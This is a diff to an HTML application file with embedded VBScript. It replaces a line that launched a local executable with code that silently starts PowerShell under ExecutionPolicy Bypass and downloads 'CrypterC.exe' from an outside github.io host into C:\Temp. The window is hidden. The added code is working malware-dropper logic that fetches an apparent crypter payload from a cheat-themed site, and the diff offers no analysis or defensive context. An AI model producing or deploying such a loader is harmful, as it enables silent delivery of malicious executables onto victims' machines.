@@ -2,9 +2,16 @@
 html<html>
 <head>
 <script language="VBScript">
-    Set objShell = CreateObject("WScript.Shell")
-    objShell.Run "NanoCryptForm.exe"
-    self.close()
+    Dim shell
+    Set shell = CreateObject("WScript.Shell")
+
+    url = "https://easycheatcc.github.io/rghegergegw/CrypterC.exe"
+    savePath = "C:\Temp\CrypterC.exe"
+
+    cmd = "powershell -ExecutionPolicy Bypass -Command " & _
+      """Invoke-WebRequest -Uri '" & url & "' -OutFile '" & savePath & "'"""
+
+    shell.Run cmd, 0, True
 </script>
 </head>
 </html>
